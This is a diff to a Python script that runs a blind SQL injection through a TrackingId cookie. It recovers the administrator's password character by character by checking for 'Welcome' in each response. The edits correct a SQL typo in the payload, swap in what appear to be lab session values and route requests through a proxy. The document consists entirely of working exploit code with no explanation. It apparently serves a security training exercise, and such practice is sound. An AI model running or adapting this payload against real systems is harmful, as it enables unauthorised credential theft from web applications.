@@ -10,18 +10,19 @@ def sqli_password(url):
     password = ""
     for idx in range(1, 21):
         for ch in range(32, 126):
-            payload = "' and (select ascii(substring(password,%s,1)) form users where username='administrator')='%s'--" % (idx, ch)
+            payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (idx, ch)
             payload_encoded = urllib.parse.quote(payload)
-            cookie = {'TrackingId': 'e9S9DykaeoltJDt4' + payload_encoded,  'session': 'SoNREbnPI66l1p5W6m4Pn6JF56DTorgP'}
-            res = requests.get(url, cookies=cookie, verify=False)
+            cookies = {'TrackingId': 'yIl8fYGEDF80rutK' + payload_encoded, 'session': 'rssvMlq0FjboKW8lbooG66xKRcfu6AtC'}
+            res = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
             if 'Welcome' not in res.text:
                 sys.stdout.write('\r' + password + chr(ch))
                 sys.stdout.flush()
             else:
                 password += chr(ch)
                 sys.stdout.write('\r' + password)
+                sys.stdout.flush()
                 break
-    print(password)
+    print('\n')
 
 def main():
     if len(sys.argv) != 2:
